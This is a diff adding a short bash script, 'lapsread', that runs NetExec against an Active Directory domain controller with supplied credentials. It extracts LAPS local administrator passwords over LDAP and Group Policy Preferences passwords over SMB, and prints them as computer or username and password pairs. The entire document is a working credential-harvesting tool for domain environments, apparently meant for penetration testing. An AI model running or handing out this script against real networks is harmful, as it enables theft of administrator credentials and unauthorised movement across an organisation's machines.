@@ -1,0 +1,53 @@
+#!/bin/bash
+
+RED='\033[31m'
+GREEN='\033[32m'
+BLUE='\033[34m'
+YELLOW='\033[33m'
+CYAN='\033[36m'
+NC='\033[0m'
+
+usage() {
+    echo -e "${RED}Usage: lapsread <dc_ip> <domain> <user> <pass>${NC}"
+    echo -e "${RED}  Ex:  lapsread 10.10.10.1 corp.local john Password123${NC}"
+    exit 1
+}
+
+[ "$#" -ne 4 ] && usage
+
+DC_IP="$1"
+DOMAIN="$2"
+USER="$3"
+PASS="$4"
+
+echo ""
+echo -e "${YELLOW}== LAPS & GPP: $DOMAIN ($DC_IP) ==${NC}"
+
+# LAPS
+echo -e "\n${CYAN}[LAPS Passwords]${NC}"
+LAPS_OUT=$(nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M laps 2>/dev/null)
+LAPS_FOUND=$(echo "$LAPS_OUT" | grep -i 'password\|laps' | grep -v '\[-\]')
+
+if [ -n "$LAPS_FOUND" ]; then
+    echo "$LAPS_OUT" | grep -oP 'Computer:\s*\K\S+|Password:\s*\K\S+' | \
+        paste - - | awk '{printf "%-25s → %s\n", $1, $2}' | \
+        while read line; do echo -e "${GREEN}$line${NC}"; done
+else
+    echo -e "${RED}[-] No LAPS passwords found (no access or not configured)${NC}"
+fi
+
+# GPP
+echo -e "\n${CYAN}[GPP Passwords]${NC}"
+GPP_OUT=$(nxc smb "$DC_IP" -u "$USER" -p "$PASS" -M gpp_password 2>/dev/null)
+GPP_FOUND=$(echo "$GPP_OUT" | grep -i 'password\|username' | grep -v '\[-\]')
+
+if [ -n "$GPP_FOUND" ]; then
+    echo "$GPP_OUT" | grep -oP 'Username:\s*\K\S+|Password:\s*\K\S+' | \
+        paste - - | awk '{printf "%-25s → %s\n", $1, $2}' | \
+        while read line; do echo -e "${GREEN}$line${NC}"; done
+else
+    echo -e "${RED}[-] No GPP passwords found${NC}"
+fi
+
+echo ""
+echo -e "${YELLOW}=================================${NC}"
